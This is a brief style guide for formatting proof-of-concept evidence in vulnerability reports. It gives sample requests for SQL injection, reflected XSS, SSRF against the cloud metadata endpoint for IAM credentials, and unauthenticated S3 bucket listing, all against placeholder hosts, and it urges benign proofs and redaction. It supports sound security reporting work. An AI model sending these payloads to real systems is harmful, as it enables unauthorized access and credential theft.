# PoC Formatting Patterns

General rules: label blocks `http`; mark the payload/evidence line with `# <== PAYLOAD` / `# <== EVIDENCE`; redact secrets but keep it reproducible; show the minimal trigger.

## SQL injection
```http
GET /product?id=10' OR '1'='1 HTTP/1.1      # <== PAYLOAD (boolean-based)
Host: target.example
```
Evidence: response returns rows for all products / DB error differential. Prefer a benign proof (e.g., version string) over data exfiltration.

## Reflected XSS
```http
GET /search?q=<svg/onload=alert(document.domain)> HTTP/1.1   # <== PAYLOAD
Host: target.example
```
Evidence: payload reflected unencoded in response body (show the reflected line). Use a harmless proof (`document.domain`), not a live exploit.

## SSRF → cloud metadata
```http
POST /import HTTP/1.1
Host: target.example
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/iam/..."}   # <== PAYLOAD (internal target, in scope)
```
Evidence: response includes internal/metadata content (redact any real credentials).

## Auth/BOLA bypass
Show two requests: baseline as owner, then the cross-account request as another user returning the victim's data (highlight the ID swap and the leaked field).

## CLI / cloud / mobile
```bash
$ aws s3 ls s3://<bucket> --no-sign-request     # <== PAYLOAD (unauthenticated access)
2026-01-01  ... customer-export.csv             # <== EVIDENCE
```
Same principle: exact command + salient output, secrets redacted.

## Chained PoC
Number the steps as an ordered sequence; each step's output becomes the next step's input. Reference the `vuln-chaining` worksheet.
